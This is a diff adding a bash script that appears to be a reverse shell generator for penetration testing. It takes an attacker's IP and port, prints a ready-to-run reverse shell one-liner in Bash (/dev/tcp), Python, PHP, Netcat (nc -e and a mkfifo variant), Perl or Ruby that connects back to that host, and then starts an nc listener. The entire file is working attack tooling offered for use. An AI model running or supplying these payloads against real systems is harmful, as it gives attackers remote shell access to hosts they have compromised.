@@ -1,0 +1,162 @@
+#!/bin/bash
+
+####################
+#Created by Ph41ynX#
+###23 April, 2020###
+####################
+#Reverse shells from: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+RED='\033[0;31m'
+GREEN='\033[0;92m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+YELLOW='\033[0;33m'
+BIYELLOW='\033[1;93m'
+BIRED='\033[1;91m'
+BIWHITE='\033[1;97m'
+NC='\033[0m'
+	
+printf "\n\n\n\n\n\n"
+echo -e "${PURPLE}"
+echo "
+ #####     #    #######          #####           #####
+#     #   ##    #    #          #     #  #    # #     #  #       #       ######
+#        # #        #           #        #    #       #  #       #           #
+#  ####    #       #     #####   #####   ######  #####   #       #          #
+#     #    #      #                   #  #    #       #  #       #         #
+#     #    #      #             #     #  #    # #     #  #       #        #
+ #####   #####    #              #####   #    #  #####   ######  ######  ######
+"
+
+echo -e "${BIWHITE}"
+printf "Please select a Reverse Shell from the following options: \n\n"
+echo -e "${YELLOW}"
+lang=('Bash' 'Python' 'PHP' 'Netcat' 'Netcat:alt' 'Perl' 'Ruby' 'Exit')
+select shell in "${lang[@]}"
+
+do
+	case $shell in
+	
+		"Bash")
+			echo -e "${BIYELLOW}"
+			echo "Bash Selected!"
+			echo -e "${BLUE}"
+			read -rp "Enter Your IP: " ip
+			read -rp "Enter Listening Port: " port
+			echo -e "${BIYELLOW}"
+			printf "Here is your Bash Reverse Shell: \n\n"
+			echo -e "${RED}"
+			echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
+			printf "\n\n"
+			echo -e "${GREEN}"
+			echo "nc -lvnp $port" | bash
+			echo -e "${NC}"
+			exit 1
+			;;
+		"Python")
+			echo -e "${BIYELLOW}"
+			echo "Python Selected!"
+			echo -e "${BLUE}"
+			read -rp "Enter Your IP: " ip
+			read -rp "Enter Listening Port: " port
+			echo -e "${BIYELLOW}"
+			printf "Here is your Python Reverse Shell: \n\n"
+			echo -e "${RED}"
+			echo -e "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+			printf "\n\n"
+			echo -e "${GREEN}"
+			echo "nc -lvnp $port" | bash
+			echo -e "${NC}"
+			exit 1
+			;;
+		"PHP")
+			echo -e "${BIYELLOW}"
+			echo "PHP Selected!"
+			echo -e "${BLUE}"
+			read -rp "Enter Your IP: " ip
+			read -rp "Enter Listening Port: " port
+			echo -e "${BIYELLOW}"
+			printf "Here is your PHP Reverse Shell: \n\n"
+			echo -e "${RED}"
+			echo "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+			printf "\n\n"
+			echo -e "${GREEN}"
+			echo "nc -lvnp $port" | bash
+			echo -e "${NC}"
+			exit 1
+			;;
+		"Netcat")
+			echo -e "${BIYELLOW}"
+			echo "Netcat Selected!"
+			echo -e "${BLUE}"
+			read -rp "Enter Your IP: " ip
+			read -rp "Enter Listening Port: " port
+			echo -e "${BIYELLOW}"
+			printf "Here is your Netcat Reverse Shell: \n\n"
+			echo -e "${RED}"
+			echo "nc -e /bin/sh $ip $port"
+			printf "\n\n"
+			echo -e "${GREEN}"
+			echo "nc -lvnp $port" | bash
+			echo -e "${NC}"
+			exit 1
+			;;
+		"Netcat:alt")
+			echo -e "${BIYELLOW}"
+			echo "Alternate Netcat Selected!"
+			echo -e "${BLUE}"
+			read -rp "Enter Your IP: " ip
+			read -rp "Enter Listening Port: " port
+			echo -e "${BIYELLOW}"
+			printf "Here is your Alternate Netcat Reverse Shell: \n\n"
+			echo -e "${RED}"
+			echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
+			printf "\n\n"
+			echo -e "${GREEN}"
+			echo "nc -lvnp $port" | bash
+			echo -e "${NC}"
+			exit 1
+			;;
+		"Perl")
+			echo -e "${BIYELLOW}"
+			echo "Perl Selected!"
+			echo -e "${BLUE}"
+			read -rp "Enter Your IP: " ip
+			read -rp "Enter Listening Port: " port
+			echo -e "${BIYELLOW}"
+			printf "Here is your Perl Reverse Shell: \n\n"
+			echo -e "${RED}"
+			echo "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+			printf "\n\n"
+			echo -e "${GREEN}"
+			echo "nc -lvnp $port" | bash
+			echo -e "${NC}"
+			exit 1
+			;;
+		"Ruby")
+			echo -e "${BIYELLOW}"
+			echo "Ruby Selected!"
+			echo -e "${BLUE}"
+			read -rp "Enter Your IP: " ip
+			read -rp "Enter Listening Port: " port
+			echo -e "${BIYELLOW}"
+			printf "Here is your Ruby Reverse Shell: \n\n"
+			echo -e "${RED}"
+			echo "ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+			printf "\n\n"
+			echo -e "${GREEN}"
+			echo "nc -lvnp $port" | bash
+			echo -e "${NC}"
+			exit 1
+			;;
+		"Exit")
+			echo -e ${NC}
+			break
+			;;
+		*) echo -e "\n${BIRED}THAT'S AN INVALID OPTION!${YELLOW}\n\n"
+			;;
+
+	esac
+		
+			
+done
